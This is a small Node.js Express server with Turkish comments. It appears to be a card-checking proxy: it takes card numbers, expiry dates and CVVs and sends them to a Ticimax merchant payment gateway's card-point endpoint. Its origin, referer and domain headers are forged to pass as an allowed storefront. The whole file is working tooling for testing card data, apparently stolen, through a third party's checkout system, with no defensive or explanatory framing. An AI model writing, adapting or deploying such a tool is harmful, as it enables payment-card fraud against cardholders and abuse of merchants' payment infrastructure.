const express = require("express");
const cors = require("cors");
const axios = require("axios");

const app = express();
app.use(cors());
app.use(express.json());

app.post("/proxy", async (req, res) => {
  const { cc, month, year, cvv, lid } = req.body;

  try {
    const response = await axios.get("https://checkout-gw.prod.ticimax.net/payments/9/card-point", {
      params: {
        cc,
        month,
        year,
        cvv,
        lid
      },
      headers: {
        "domain-name": "hzqquarex-1.onrender.com", // senin adresin burada!
        "origin": "https://hzqquarex-1.onrender.com",
        "referer": "https://hzqquarex-1.onrender.com"
      }
    });

    res.json(response.data);
  } catch (error) {
    if (error.response) {
      res.status(error.response.status).json(error.response.data);
    } else {
      res.status(500).json({ error: "Bir hata oluştu." });
    }
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Sunucu çalışıyor: http://localhost:${PORT}`);
});
